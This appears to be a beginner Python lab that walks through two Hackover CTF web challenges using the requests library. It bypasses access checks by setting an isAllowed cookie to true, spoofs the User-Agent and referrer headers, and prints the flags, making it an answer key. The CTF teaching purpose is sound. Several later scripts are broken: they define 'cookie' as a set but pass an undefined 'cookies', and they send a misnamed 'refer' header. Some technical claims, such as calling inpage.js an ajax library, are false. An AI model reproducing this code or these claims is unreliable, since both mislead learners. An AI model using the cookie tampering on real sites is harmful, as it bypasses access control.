# Requests Lab

Need to `pip` install `requests` library if you do not already have it.

> $ pip install requests

Pip varies from system to system so please ask for help if you are having trouble.

## Todays Lesson
This lesson is inspired by the Hackover CTF challenges `ez web` and `i-love-heddha`. They are web challenges, but this lesson will teach you how well python integrates with the web, while also showing you how the internet works.

## ez web
This is a fairly basic one but it will show you alot.

Go to http://ez-web.ctf.hackover.de:8080 in Google Chrome (may need to turn on developer tools) and you will see a interesting web page that says under construction.

The first thing you should do is inspect the element. Then go over to the sources tab (how it is on Google Chrome) and see was provided by the server. It turns out there is only an `index.html` file (the main webpage) and a folder called `MetaMask` with `inpage.js`. `inpage.js` is a ajax library for javascript, it is not that important for the way we are solving the problem.

So the sources did not provide anything useful (yet) but so lets try looking for a `robots.txt`. `robots.txt` is a file included in most webpages that tells nice web crawlers (belonging to legal companies) where not to look. Lets see where we SHOULD NOT look.

Go to: http://ez-web.ctf.hackover.de:8080/robots.txt

It displays:
```
User-agent: * Disallow: /flag/
```

Lets see what is in [/flag/](http://ez-web.ctf.hackover.de:8080/flag/)

There is a link to `flag.txt` lets [click](http://ez-web.ctf.hackover.de:8080/flag/flag.txt) on it:
```
You do not have permission to enter this Area. A mail has been sent to our Admins.
You shall be arrested shortly.
```
Oh-no we got a permission denied. But how does the webpage know we can't have access to it?

Well it uses COOKIES which are parameters that the get passed from your computer to the webpage. Cookies are responsible for saving the our logins to various websites, and they are incredibly useful. Lets see if this webpage has any cookies?

To find the cookies got to the console on Google Chrome and enter:
```
> document.cookie
< "isAllowed=false"
```

The document object has to do with the inpage.js memtioned earlier.

Now that we know what the cookie is lets change the value of `isAllowed` to `true`.

To do this lets just use `=`:
```
> document.cookie = "isAllowed=true"
< "isAllowed=true"
```

Refresh it and you get the FLAG: `hackover18{W3llD0n3,K1d.Th4tSh0tw4s1InAM1ll10n}`

Great now lets do it in python using the requests library.

```python
import requests

url = "http://ez-web.ctf.hackover.de:8080/flag/flag.txt"
cookies = {"isAllowed": "true"} # cookies is a dictionary in python

r = requests.get(url, cookies=cookies)

print(r.text)
```
When runs it returns
```html
<!DOCTYPE html>
	<head>
		<title>Well done!</title>
	</head>
	<body>
		<p>hackover18{W3llD0n3,K1d.Th4tSh0tw4s1InAM1ll10n}</p>
	</body>
</html>
```

Which is the webpage.

Can you think of a way to parse the html? (Hint: use BeautifulSoup)

## i-love-heddha

This challenge is an extension of `ez web` because when we visit the url [207.154.226.40:8080](207.154.226.40:8080) it is pretty much the same thing.

Let's go to [207.154.226.40:8080/flag/flag.txt](207.154.226.40:8080/flag/flag.txt) like last time.

Lets check cookies:
```
> document.cookie
< "isAllowed=false"
```

Oh this is an easy fix:
```
> document.cookie = "isAllowed=true"
< "isAllowed=true"
```

But once on reloading it gives us this
```
You are using the wrong browser, 'Builder browser 1.0.1' is required
```

What the hell. We need a nonexistent browser to access it. So the options we have are to create a brand new browser name 'Builder browser 1.0.1' or we can spoof the browser with python.

When we visit a webpage, our browser sends that it is Google Chrome in the headers of the GET request (a request to pull down a webpage from a server). The webpage here is seeing that we are visiting from Google Chrome, and is like (no we are not going to show the webpage). This is really useful for websites that only depend on certain browser versions, but not for us because we need a nonexistent browser.

But with python we can fill out the browser section of the header in the GET request with 'Builder Browser 1.0.1'.

Lets do that:
```python
import requests

url = "http://207.154.226.40:8080/flag/flag.txt"
cookie = {'isAllowed', 'true'}

#headers
headers = requests.utils.default_headers() # get basic webpage headers

headers.update(
    {
        'User-Agent': 'Builder browser 1.0.1'
    }
)

r = requests.get(url, headers=headers, cookies=cookies)

print(r.text)
```

We get:
```html
<!DOCTYPE html>
	<head>
		<title>Almost</title>
	</head>
	<body>
		<p>You are refered from the wrong location hackover.18 would be the correct place to come from.</p>
	</body>
</html>
```

So close lets try changing the refers which is in the headers.
```python
import requests

url = "http://207.154.226.40:8080/flag/flag.txt"
cookie = {'isAllowed', 'true'}

#headers
headers = requests.utils.default_headers() # get basic webpage headers

headers.update(
    {
        'User-Agent': 'Builder browser 1.0.1',
        'refer': 'hackover.18'
    }
)

r = requests.get(url, headers=headers, cookies=cookies)

print(r.text)
```

We get `aGFja292ZXIxOHs0bmdyeVczYlMzcnYzclM0eXNOMH0=`, that does not look like a flag?



Well that because it is encoded, specifically base64. So lets use the base64 library
```python
import requests
import base64

url = "http://207.154.226.40:8080/flag/flag.txt"
cookie = {'isAllowed', 'true'}

#headers
headers = requests.utils.default_headers() # get basic webpage headers

headers.update(
    {
        'User-Agent': 'Builder browser 1.0.1',
        'refer': 'hackover.18'
    }
)

r = requests.get(url, headers=headers, cookies=cookies)

print(base64.b64decode(r.text).decode('utf-8'))
```
hackover18{4ngryW3bS3rv3rS4ysN0}

Good job
